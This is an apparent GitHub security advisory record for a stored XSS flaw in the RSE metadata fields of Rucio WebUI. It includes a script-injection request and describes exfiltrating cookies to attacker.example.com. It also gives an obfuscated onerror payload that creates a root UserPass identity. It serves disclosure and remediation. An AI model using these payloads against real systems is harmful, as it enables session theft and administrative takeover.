advisory_id: GHSA-h9fp-p2p9-873q
datasource_id: github_osv_importer_v2/GHSA-h9fp-p2p9-873q
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-h9fp-p2p9-873q/GHSA-h9fp-p2p9-873q.json
aliases:
  - CVE-2026-25734
summary: "Rucio WebUI has Stored Cross-site Scripting (XSS) in RSE Metadata\n### Summary\nA\
  \ stored Cross-site Scripting (XSS) vulnerability was identified in the RSE metadata of the\
  \ WebUI where attacker-controlled input is persisted by the backend and later rendered in\
  \ the WebUI without proper output encoding. This allows arbitrary JavaScript execution in\
  \ the context of the WebUI for users who view affected pages, potentially enabling session\
  \ token theft or unauthorized actions.\n\n---\n### Details\nSeveral metadata fields accept\
  \ arbitrary input which is stored and later rendered unsafely in the WebUI when the RSEs are\
  \ listed in the RSE Management dashboard.\n\n**Create Path**:  \nAdmin > RSE Management\n\n\
  **Trigger Paths**:  \nAdmin > RSE Management  \nAdmin > RSE Management > _RSE NAME_\n\n**Vulnerable\
  \ Attributes**:  \nCity, Country_Name, ISP\n\n**Request**\n```http\nPOST /proxy/rses/XSSTEST\
  \ HTTP/1.1\n...\n{\"city\":\"<script>alert('CITY XSS')</script>\",\"country_name\":\"<script>alert('COUNTRY\
  \ XSS')</script>\",\"ISP\":\"<script>alert('ISP XSS')</script>\",\"deterministic\":false,\"\
  volatile\":false,\"staging_area\":false}\n```\n\n**Response**\n```http\nHTTP/1.1 201 CREATED\n\
  ...\nCreated\n```\n\n**Stored XSS payload triggering in RSE listing after adding XSS payload\
  \ in metadata**\n<img width=\"1252\" height=\"624\" alt=\"Stored XSS payload triggering in\
  \ RSE listing after adding XSS payload in metadata\" src=\"https://github.com/user-attachments/assets/6546fc95-0c81-4db7-9271-37b5d4bc8f47\"\
  \ />\n\n---\n### Impact\nAny authenticated user who views affected resources may execute attacker-controlled\
  \ JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users\
  \ or administrative users only.\n\nThe impact is amplified by:\n- Session cookies that are\
  \ accessible to JavaScript (missing HttpOnly flag).\n- API tokens exposed to the WebUI via\
  \ JavaScript variables.\n\nAn attacker would likely attempt to exfiltrate the session token\
  \ to an external site by setting an encoded version of the cookie as the path of a GET request\
  \ to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).\n\
  \nAttackers can also perform actions as the victim like creating a new UserPass identity with\
  \ an attacker known password, creating/deleting an RSE, or exfiltrating data.\n\n**XSS Payload\
  \ to Create Root UserPass**\n```html\n<img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()>\n\
  ```\n\n---\n### Remediation / Mitigation\nAll client-side renderings of server-provided or\
  \ user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe\
  \ methods such as `.html()` should be avoided unless the content is explicitly sanitized.\
  \ Safer alternatives include `.text()`, creating text nodes, or using a templating system\
  \ that enforces automatic escaping.\n\nAdditional defense-in-depth measures include:\n- Enforcing\
  \ a strict Content Security Policy (CSP).\n- Setting the HttpOnly flag on session cookies.\n\
  - Avoiding exposure of API tokens in JavaScript-accessible variables.\n\n> Note that many\
  \ pages were found setting the API token as `token` in an authenticated response like `var\
  \ token = \"root-root-webui-...:\"` (See `/ui/list_accounts` for example)\n\n---\n### Resources\n\
  - OWASP XSS Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)"
impacted_packages:
  - purl: pkg:pypi/rucio-webui
    affected_versions: vers:pypi/<35.8.3
    fixed_versions: vers:pypi/35.8.3
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/rucio-webui
    affected_versions: vers:pypi/>=36.0.0rc1|<38.5.4
    fixed_versions: vers:pypi/38.5.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/rucio-webui
    affected_versions: vers:pypi/>=39.0.0rc1|<39.3.1
    fixed_versions: vers:pypi/39.3.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '6.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-h9fp-p2p9-873q/GHSA-h9fp-p2p9-873q.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-1004
  - CWE-79
references:
  - url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/releases/tag/35.8.3
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/releases/tag/38.5.4
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/releases/tag/39.3.1
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/security/advisories/GHSA-h9fp-p2p9-873q
    reference_type:
    reference_id:
